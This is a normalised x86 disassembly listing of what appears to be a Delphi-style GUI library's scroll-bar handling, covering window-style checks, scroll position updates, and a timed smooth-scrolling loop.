lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
sub_459374
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0x80000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_459404
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416a84
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_459ccc
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_459cac
mov edx [ edi + 0xc ]
mov eax ebx
call sub_459b5c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459454
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45960c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4423f0
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_459b5c
xor edx edx
mov eax ebx
call sub_459b5c
jmp r-xdata
sub_45948c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_428b7c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4594f8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_428b7c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_459560
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_459c94
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_445284
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_459c94
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_445248
call sub_4594f8
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_445248
call sub_45948c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_45960c
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_448484
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_459644
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_459678
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_459644
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_459644
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_4596f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_459678
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_441768
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_459678
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4417ac
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45978c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_4597ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4599bd ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4596f4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4596f4
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
push ebp
call sub_45978c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
push ebp
call sub_45978c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_40743c
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_459b5c
jmp r-xdata
sub_459ae4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45a1b0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_459b5c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_448484
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_448484
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_44807c
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_44807c
jmp r-xdata
call sub_4592cc
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_459c20
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_45a1b0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_459cd8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
call sub_42c06c
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
call sub_42c06c
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
call sub_42c06c
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_421054
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
call sub_42c06c
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
call sub_42c06c
sub_459de0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4596f4
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_4596f4
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_459cd8
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_448484
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_459b5c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_4596f4
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_459ef8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444294
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_459374
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_459374
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_459f60
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4036c0
mov eax [ esi + 0x20c ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_459fac
push ebx
mov ebx eax
mov eax ebx
call sub_44550c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_45a1b0
pop ebx
retn
mov eax ebx
call sub_448484
push eax
call sub_42c0a0
sub_459fd8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a130
mov ecx edi
mov edx esi
mov eax ebx
call sub_444c54
pop edi
pop esi
pop ebx
retn
sub_45a018
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45a120
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441768
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_45960c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_459b5c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445248
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445248
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_416044
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4414d4
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a127
mov eax [ ebp - 0x10 ]
call sub_4036c0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_459454
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4161a0
xor ecx ecx
mov edx 0xb03e
call sub_442f30
inc ebx
dec esi
jne r-xdata
sub_45a154
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_459cac
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_459cac
mov eax ebx
call sub_45a130
jmp r-xdata
sub_45a1b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
xor eax eax
push ebp
push sub_45a29b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_459774
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_459774
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_459de0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_459de0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_459de0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_459de0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_459de0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_459de0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45a2c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_44187c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4418a8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_44187c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4418a8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_441768
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_459b5c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_441768
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4417ac
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_459b5c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_441768
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_459b5c
mov eax ebx
call sub_441768
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4417ac
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4417ac
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_459b5c
mov eax ebx
call sub_4417ac
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_45a414
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_459b5c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_459b5c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
